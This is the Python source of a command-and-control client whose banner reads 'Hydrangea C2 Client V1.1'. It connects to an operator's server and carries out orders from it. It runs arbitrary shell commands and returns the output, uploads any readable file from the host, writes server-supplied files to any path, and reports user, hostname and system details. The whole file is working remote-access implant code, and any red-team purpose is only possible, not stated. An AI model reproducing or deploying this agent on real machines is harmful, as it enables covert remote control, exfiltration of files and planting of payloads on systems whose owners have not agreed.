import argparse
import asyncio
import json
import logging
import os
import stat
import sys
import platform
import socket
import getpass
from typing import Optional

from common import read_frame, write_frame, sha256_bytes, resolve_client_path

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
log = logging.getLogger("pyxfer.client")


async def handle_server(
    reader: asyncio.StreamReader, writer: asyncio.StreamWriter, root: str
):
    try:
        while not reader.at_eof():
            header, payload = await read_frame(reader)
            t = header.get("type")

            if t == "PING":
                await write_frame(writer, {"type": "PONG"})

            elif t == "LIST_DIR":
                path = header.get("path", ".")
                req_id = header.get("req_id")
                entries = []
                try:
                    real = resolve_client_path(root, path)
                    for name in os.listdir(real):
                        fp = os.path.join(real, name)
                        try:
                            st = os.stat(fp)
                            entries.append(
                                {
                                    "name": name,
                                    "is_dir": stat.S_ISDIR(st.st_mode),
                                    "bytes": st.st_size,
                                    "mtime": int(st.st_mtime),
                                }
                            )
                        except FileNotFoundError:
                            continue
                    resp_header = {
                        "type": "RESULT_LIST_DIR",
                        "path": path,
                        "entries_count": len(entries),
                    }
                    if req_id is not None:
                        resp_header["req_id"] = req_id
                    await write_frame(
                        writer, resp_header, json.dumps(entries).encode("utf-8")
                    )
                except Exception as e:
                    await write_frame(
                        writer,
                        {"type": "LOG", "message": f"LIST_DIR failed for {path}: {e}"},
                    )

            elif t == "PULL_FILE":
                src = header.get("src_path")
                save_as = header.get("save_as") or os.path.basename(src or "file.bin")
                try:
                    real = resolve_client_path(root, src)
                    with open(real, "rb") as f:
                        data = f.read()
                    digest = sha256_bytes(data)
                    await write_frame(
                        writer,
                        {
                            "type": "FILE",
                            "src_path": src,
                            "save_as": save_as,
                            "sha256": digest,
                        },
                        data,
                    )
                except Exception as e:
                    await write_frame(
                        writer,
                        {"type": "LOG", "message": f"PULL_FILE failed for {src}: {e}"},
                    )

            elif t == "PUSH_FILE":
                dest = header.get("dest_path")
                src_name = header.get("src_name", "server_upload.bin")
                try:
                    real = resolve_client_path(root, dest)
                    d = os.path.dirname(real) or "/"
                    os.makedirs(d, exist_ok=True)
                    with open(real, "wb") as f:
                        f.write(payload or b"")
                    await write_frame(
                        writer,
                        {
                            "type": "LOG",
                            "message": f"Saved file to {dest} ({len(payload or b'')} bytes) from {src_name}",
                        },
                    )
                except Exception as e:
                    await write_frame(
                        writer,
                        {"type": "LOG", "message": f"PUSH_FILE failed for {dest}: {e}"},
                    )

            elif t == "EXEC":
                # Execute a system command and return stdout/stderr/rc
                req_id = header.get("req_id")
                cmd = header.get("cmd")
                shell = bool(header.get("shell", False))
                cwd = header.get("cwd")
                timeout = float(header.get("timeout", 30.0))

                try:
                    exec_cwd: Optional[str] = (
                        resolve_client_path(root, cwd) if cwd else None
                    )
                    if shell:
                        proc = await asyncio.create_subprocess_shell(
                            cmd if isinstance(cmd, str) else " ".join(map(str, cmd)),
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                            cwd=exec_cwd,
                        )
                    else:
                        # Not shell: if string, naive split; if list, use as-is
                        if isinstance(cmd, str):
                            args = cmd.split()
                        else:
                            args = list(cmd)
                        proc = await asyncio.create_subprocess_exec(
                            *args,
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                            cwd=exec_cwd,
                        )

                    try:
                        out, err = await asyncio.wait_for(
                            proc.communicate(), timeout=timeout
                        )
                        rc = proc.returncode
                    except asyncio.TimeoutError:
                        try:
                            proc.kill()
                        except Exception:
                            pass
                        out, err, rc = b"", b"timeout", None

                    result = {
                        "rc": rc,
                        "stdout": (
                            out.decode("utf-8", errors="replace") if out else ""
                        ),
                        "stderr": (
                            err.decode("utf-8", errors="replace") if err else ""
                        ),
                    }
                    resp_header = {"type": "RESULT_EXEC", "rc": rc}
                    if req_id is not None:
                        resp_header["req_id"] = req_id
                    await write_frame(
                        writer, resp_header, json.dumps(result).encode("utf-8")
                    )
                except Exception as e:
                    resp_header = {"type": "RESULT_EXEC", "rc": None}
                    if req_id is not None:
                        resp_header["req_id"] = req_id
                    result = {"rc": None, "stdout": "", "stderr": f"EXEC error: {e}"}
                    await write_frame(
                        writer, resp_header, json.dumps(result).encode("utf-8")
                    )

            elif t == "SESSION_INFO":
                req_id = header.get("req_id")
                try:
                    info = {
                        "platform": platform.platform(),
                        "system": platform.system(),
                        "release": platform.release(),
                        "version": platform.version(),
                        "machine": platform.machine(),
                        "processor": platform.processor(),
                        "python": platform.python_version(),
                        "pid": os.getpid(),
                        "user": _safe_getuser(),
                        "cwd": os.getcwd(),
                        "hostname": socket.gethostname(),
                        "root": root,
                        "executable": sys.executable,
                    }
                    resp_header = {"type": "RESULT_SESSION_INFO"}
                    if req_id is not None:
                        resp_header["req_id"] = req_id
                    await write_frame(
                        writer, resp_header, json.dumps(info).encode("utf-8")
                    )
                except Exception as e:
                    await write_frame(
                        writer, {"type": "LOG", "message": f"SESSION_INFO error: {e}"}
                    )

            else:
                await write_frame(
                    writer, {"type": "LOG", "message": f"Unknown order type {t}"}
                )

    except asyncio.IncompleteReadError:
        log.warning("Server closed connection")
    except Exception as e:
        log.exception(f"Error in handle_server: {e}")
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass


def _safe_getuser() -> str:
    try:
        return getpass.getuser()
    except Exception:
        return os.environ.get("USER") or os.environ.get("USERNAME") or "unknown"


art = r"""

   ▄█    █▄    ▄██   ▄   ████████▄     ▄████████    ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄████████ 
  ███    ███   ███   ██▄ ███   ▀███   ███    ███   ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███    ███ 
  ███    ███   ███▄▄▄███ ███    ███   ███    ███   ███    ███ ███   ███   ███    █▀    ███    █▀    ███    ███ 
 ▄███▄▄▄▄███▄▄ ▀▀▀▀▀▀███ ███    ███  ▄███▄▄▄▄██▀   ███    ███ ███   ███  ▄███         ▄███▄▄▄       ███    ███ 
▀▀███▀▀▀▀███▀  ▄██   ███ ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ ███   ███ ▀▀███ ████▄  ▀▀███▀▀▀     ▀███████████ 
  ███    ███   ███   ███ ███    ███ ▀███████████   ███    ███ ███   ███   ███    ███   ███    █▄    ███    ███ 
  ███    ███   ███   ███ ███   ▄███   ███    ███   ███    ███ ███   ███   ███    ███   ███    ███   ███    ███ 
  ███    █▀     ▀█████▀  ████████▀    ███    ███   ███    █▀   ▀█   █▀    ████████▀    ██████████   ███    █▀  
                                      ███    ███                                                               

              Hydrangea C2 Client  •  V1.1
"""


async def amain():
    ap = argparse.ArgumentParser(description="pyxfer client")
    ap.add_argument("--server", required=True, help="Server hostname/IP")
    ap.add_argument(
        "--port",
        type=int,
        required=True,
        help="Server port (one of the listening ports)",
    )
    ap.add_argument("--client-id", required=True, help="Unique ID for this client")
    ap.add_argument("--auth-token", required=True, help="Shared auth token")
    ap.add_argument(
        "--root",
        default=".",
        help="Preferred base for relative paths. Absolute paths are always allowed.",
    )
    args = ap.parse_args()

    print(art)

    root_path = os.path.abspath(args.root)
    if not os.path.isdir(root_path):
        # Create if missing (ok if this fails due to permissions; we only use it for relative paths)
        try:
            os.makedirs(root_path, exist_ok=True)
        except Exception:
            pass

    reader, writer = await asyncio.open_connection(args.server, args.port)
    await write_frame(
        writer,
        {"type": "REGISTER", "client_id": args.client_id, "token": args.auth_token},
    )
    header, _ = await read_frame(reader)
    if header.get("type") != "REGISTERED":
        raise RuntimeError(f"Registration failed: {header}")

    log.info(f"Registered with server. Root base for relatives: {root_path}")
    await handle_server(reader, writer, root_path)


if __name__ == "__main__":
    asyncio.run(amain())
